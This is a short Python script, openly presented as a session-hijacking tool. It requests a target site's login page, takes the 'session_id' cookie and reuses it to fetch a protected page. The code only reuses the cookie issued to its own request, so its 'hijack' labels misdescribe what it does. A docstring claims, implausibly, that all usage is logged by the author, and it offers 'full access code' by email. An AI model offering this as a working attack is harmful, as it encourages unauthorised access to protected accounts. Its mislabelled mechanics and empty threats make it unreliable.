import requests

target_url = 'http://example.com'   # Target URL you can do whatever you want with it

"""
    Please Don't misuse this if you do it will be a crime and you all usage is recorded in log file of mine so don't even think about it
    Also coping code and paste in other file won't help so don't do it
    If you want to get full access code ethically contact me at my email id: sujalfaganiya2005@gmail.com / sujalpatel1709@gmail.com
"""

"""_
    step 1: Send a GET request to the target URL
    step 2: Get the response from the server
    step 3: Check if the response was successful (status code 200)
    step 4: If the response was successful, print the response content
"""

# Function to capture the session cookie
def capture_session_cookie():
    # Send a request to the login page to capture the session cookie
    response = requests.get(target_url + '/login')
    session_cookie = response.cookies.get('session_id')
    return session_cookie

# Function to hijack the session
def hijack_session(session_cookie):
    # Create a session object with the captured session cookie
    session = requests.Session()
    session.cookies.set('session_id', session_cookie)

    # Make an authenticated request using the hijacked session
    response = session.get(target_url + '/protected_page')
    return response.text

# Main function
def main():
    # Capture the session cookie
    session_cookie = capture_session_cookie()
    if not session_cookie:
        print("Failed to capture session cookie.")
        return

    print(f"Captured session cookie: {session_cookie}")

    # Hijack the session
    response_content = hijack_session(session_cookie)
    print("Hijacked session content:")
    print(response_content)

if __name__ == "__main__":
    main()
